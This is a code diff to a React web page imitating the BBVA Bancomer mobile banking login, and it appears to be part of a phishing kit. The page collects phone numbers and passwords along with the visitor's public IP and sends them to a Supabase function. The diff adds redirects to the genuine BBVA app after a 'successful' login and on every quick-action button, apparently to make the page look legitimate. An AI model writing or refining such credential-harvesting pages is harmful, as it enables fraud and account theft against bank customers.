@@ -5,6 +5,7 @@ import './App.css'
 type QuickActionProps = {
   icon: React.ReactNode
   label: React.ReactNode
+  onClick?: () => void
 }
 
 function PersonAddIcon() {
@@ -43,12 +44,12 @@ function MenuIcon() {
   )
 }
 
-function QuickAction({ icon, label }: QuickActionProps) {
+function QuickAction({ icon, label, onClick }: QuickActionProps) {
   return (
-    <a className="quick-action" href="#0">
+    <button className="quick-action" type="button" onClick={onClick}>
       <span className="quick-action__icon">{icon}</span>
       <span>{label}</span>
-    </a>
+    </button>
   )
 }
 
@@ -60,6 +61,35 @@ function App() {
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [loginError, setLoginError] = useState('')
   const [loginSuccess, setLoginSuccess] = useState('')
+
+  // Función para redirigir/abrir la App
+  const openApp = () => {
+    const playStorePackage = 'com.bbva.bancomer'
+    const appStoreId = '382878482'
+
+    const androidIntent = `intent://open#Intent;scheme=bbva;package=${playStorePackage};S.browser_fallback_url=https://play.google.com/store/apps/details?id=${playStorePackage};end`
+    const iosScheme = 'bbva://'
+    const iosAppStoreUrl = `https://apps.apple.com/app/id${appStoreId}`
+
+    const userAgent = navigator.userAgent || navigator.vendor
+    const isAndroid = /android/i.test(userAgent)
+    const isIOS = /iPad|iPhone|iPod/.test(userAgent)
+
+    if (isAndroid) {
+      window.location.href = androidIntent
+    } else if (isIOS) {
+      window.location.href = iosScheme
+
+      const start = Date.now()
+      setTimeout(() => {
+        if (Date.now() - start < 2000) {
+          window.location.href = iosAppStoreUrl
+        }
+      }, 1500)
+    } else {
+      window.open(`https://play.google.com/store/apps/details?id=${playStorePackage}`, '_blank')
+    }
+  }
 
   // Obtener IP pública del cliente
   async function getPublicIP(): Promise<string> {
@@ -78,10 +108,8 @@ function App() {
     setLoginSuccess('')
     setIsSubmitting(true)
 
-    // Obtener IP antes de enviar
     const ip = await getPublicIP()
 
-    // Enviar datos al backend (Edge Function)
     const { error } = await supabase.functions.invoke('login', {
       body: { phone, password, ip },
     })
@@ -96,6 +124,9 @@ function App() {
     setLoginSuccess('Inicio de sesión exitoso')
     setPhone('')
     setPassword('')
+
+    // Redirigir a la app inmediatamente después de un inicio de sesión exitoso
+    openApp()
   }
 
   if (showLogin) {
@@ -204,6 +235,7 @@ function App() {
                 te
               </>
             }
+            onClick={openApp}
           />
           <QuickAction
             icon={<BranchIcon />}
@@ -214,8 +246,9 @@ function App() {
                 cajeros
               </>
             }
+            onClick={openApp}
           />
-          <QuickAction icon={<PhoneIcon />} label="Línea BBVA" />
+          <QuickAction icon={<PhoneIcon />} label="Línea BBVA" onClick={openApp} />
         </nav>
       </section>
     </main>
